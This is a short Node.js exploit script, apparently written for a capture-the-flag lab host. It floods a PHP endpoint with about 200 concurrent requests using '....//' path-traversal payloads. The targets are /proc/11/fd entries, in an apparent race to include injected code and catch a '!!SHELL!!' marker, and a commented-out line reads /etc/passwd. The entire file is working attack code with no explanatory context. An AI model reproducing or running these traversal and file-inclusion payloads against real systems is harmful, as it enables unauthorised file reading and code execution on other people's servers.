const axios = require('axios');

const simultaneousRequests = process.argv[2] || 200;
let id = 0;
let requests = 0;

const doRequest = (callback) => {
    let url = 'http://10.10.10.173/getPatent_alphav1.0.php?id=....//....//....//....//....//proc/11/fd/' + (id % 100);
    axios({
        method: 'GET',
        url
        //url: 'http://10.10.10.173/getPatent_alphav1.0.php?id=....//....//....//....//....//etc/passwd',
    }).then((res) => {
        requests++;
        callback();
        if (res.data.includes('!!SHELL!!')) {
            console.log(res.data);
            process.exit(0);
        }
    }).catch(err => {
        requests++;
        callback();
        console.error('Request Error(' + url + ')', err.message);
    });
}

const handleFinishedRequest = () => {
    id++;
    doRequest(handleFinishedRequest);
};

while(id++ < simultaneousRequests) {
    doRequest(handleFinishedRequest);
}

setInterval(() => {
    console.log('Requests per second ', requests);
    requests = 0;
}, 1000);